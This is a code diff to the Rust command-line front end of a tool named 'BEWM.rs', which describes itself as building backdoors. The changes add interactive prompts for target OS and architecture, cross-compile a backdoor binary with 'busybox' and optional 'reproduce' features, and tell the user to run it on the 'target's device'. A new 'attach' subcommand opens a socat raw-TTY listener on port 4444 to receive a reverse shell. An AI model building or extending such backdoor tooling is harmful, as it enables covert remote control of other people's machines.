@@ -1,17 +1,24 @@
 use clap::{App, Arg, SubCommand};
 use colored::*;
-use dialoguer::Select;
-use std::fs::{copy, remove_dir_all};
+use dialoguer::Input;
+use requestty::Question;
+use std::io::Write;
+use std::str::from_utf8;
 use std::{
     env::current_dir,
     process::{self, Command},
 };
+use std::{
+    fs::{copy, remove_dir_all},
+    process::Stdio,
+};
+
 fn main() {
     let systems = vec!["macOS", "windows", "linux"];
     let arches = vec!["64", "32"];
     let system_rust_names = vec!["apple-darwin", "pc-windows-gnu", "unknown-linux-musl"];
     let arch_rust_names = vec!["x86_64", "i686"];
-    let arch: usize;
+    let arch: String;
     let direc = current_dir().unwrap();
     let matches = App::new("BEWM.rs")
         .about("Backdoors Effortlessly, With Mainly rust.")
@@ -24,6 +31,10 @@ fn main() {
         //         .multiple(true)
         //         .help("Sets the level of verbosity"),
         // )
+        .subcommand(
+            SubCommand::with_name("attach")
+                .about("connect to a target computer that's already been bewm'd"),
+        )
         .subcommand(
             SubCommand::with_name("create")
                 .about("creates a BEWM executable to be ran on the target OS")
@@ -51,32 +62,60 @@ fn main() {
         .get_matches();
     if let Some(ref matches) = matches.subcommand_matches("create") {
         println!("Welcome to the BEWM creator! 💥");
+        let mut targ = None;
+        if !matches.is_present("target") {
+            let question = Question::select("stuff")
+                .message("Which OS do you want to BEWM?")
+                .choices(systems.clone())
+                .build();
+
+            targ = Some(requestty::prompt(vec![question]).unwrap());
+        }
+        let question2 = Question::select("a")
+            .message("With which architecture?")
+            .choices(arches.clone())
+            .build();
+
+        let arc = requestty::prompt(vec![question2]).unwrap();
+        let question3 = Question::confirm("rep")
+            .message("Include BEWMC in binary?")
+            .default(true)
+            .build();
+
+        let rep = requestty::prompt(vec![question3]).unwrap();
+
         let selection = if !matches.is_present("target") {
-            println!("Please choose an OS to target:");
-            Select::new().items(&systems).default(0).interact().unwrap()
+            targ.unwrap()
+                .get("stuff")
+                .unwrap()
+                .as_list_item()
+                .unwrap()
+                .text
+                .clone()
         } else {
-            systems
+            systems[systems
                 .iter()
                 .position(|&e| {
                     e.to_lowercase() == matches.value_of("target").unwrap().to_lowercase()
                 })
-                .unwrap()
+                .unwrap()]
+            .to_string()
         };
-        if selection != 0 {
+        if selection != "macOS" {
             arch = if !matches.is_present("architecture") {
-                println!("Please choose an architecture:");
-                Select::new().items(&arches).default(0).interact().unwrap()
+                arc.get("a").unwrap().as_list_item().unwrap().text.clone()
             } else {
-                arches
+                arches[arches
                     .iter()
                     .position(|&e| {
                         e.to_lowercase() == matches.value_of("architecture").unwrap().to_lowercase()
                     })
-                    .unwrap()
+                    .unwrap()]
+                .to_string()
             };
             // arch = Select::new().items(&arches).default(0).interact().unwrap();
         } else {
-            arch = 0
+            arch = "64".to_string();
         }
         println!("{}", "Downloading BEWM code...".yellow());
         // copy_items(
@@ -116,7 +155,13 @@ fn main() {
             "{}",
             format!(
                 "Building for {} using cross...",
-                arch_rust_names[arch].to_owned() + "-" + system_rust_names[selection]
+                arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
+                    .to_owned()
+                    + "-"
+                    + system_rust_names[systems
+                        .iter()
+                        .position(|&e| e.to_string() == selection)
+                        .unwrap()]
             )
             .yellow()
         );
@@ -124,10 +169,22 @@ fn main() {
             .current_dir(direc.join("bewm_compiled"))
             .arg("build")
             .arg("--release")
+            .args("--features busybox".split(' '))
+            .args(if rep.get("rep").unwrap().as_bool().unwrap() {
+                "--features reproduce".split(' ').collect()
+            } else {
+                vec![]
+            })
             // .arg("--manifest-path")
             // .arg(direc.join("bewm").join("Cargo.toml"))
             .arg(
-                "--target=".to_owned() + arch_rust_names[arch] + "-" + system_rust_names[selection],
+                "--target=".to_owned()
+                    + &arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
+                    + "-"
+                    + &system_rust_names[systems
+                        .iter()
+                        .position(|&e| e.to_string() == selection)
+                        .unwrap()],
             )
             .spawn()
             .unwrap()
@@ -144,18 +201,29 @@ fn main() {
         copy(
             direc.join(
                 "bewm_compiled/target/".to_owned()
-                    + arch_rust_names[arch]
+                    + arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
                     + "-"
-                    + system_rust_names[selection]
+                    + system_rust_names[systems
+                        .iter()
+                        .position(|&e| e.to_string() == selection)
+                        .unwrap()]
                     + "/release/bewm"
-                    + match selection {
+                    + match systems
+                        .iter()
+                        .position(|&e| e.to_string() == selection)
+                        .unwrap()
+                    {
                         1 => ".exe",
                         _ => "",
                     },
             ),
             direc.join(
                 "bewm".to_owned()
-                    + match selection {
+                    + match systems
+                        .iter()
+                        .position(|&e| e.to_string() == selection)
+                        .unwrap()
+                    {
                         1 => ".exe",
                         _ => "",
                     },
@@ -170,7 +238,11 @@ fn main() {
                 "Done! You can now execute {:?} on your target's device.",
                 direc.join(
                     "bewm".to_owned()
-                        + match selection {
+                        + match systems
+                            .iter()
+                            .position(|&e| e.to_string() == selection)
+                            .unwrap()
+                        {
                             1 => ".exe",
                             _ => "",
                         },
@@ -178,5 +250,29 @@ fn main() {
             )
             .green()
         )
+    } else if let Some(ref _matches) = matches.subcommand_matches("attach") {
+        let x: u16 = Input::new()
+            .with_prompt("Which port do you want to listen to?")
+            .default(4444)
+            .interact_text()
+            .unwrap();
+        let w = &Command::new("tty")
+            .stdout(Stdio::piped())
+            .spawn()
+            .unwrap()
+            .wait_with_output()
+            .unwrap();
+
+        let tty = from_utf8(&w.stdout).unwrap();
+        let mut bash = Command::new("bash").stdin(Stdio::piped()).spawn().unwrap();
+        write!(
+            bash.stdin.take().unwrap(),
+            "socat file:{:?},raw,echo=0 tcp-listen:{}",
+            &tty.trim_end(),
+            x
+        )
+        .unwrap();
+        println!("Listening! Please run the executable on the target machine.");
+        bash.wait().unwrap();
     }
 }
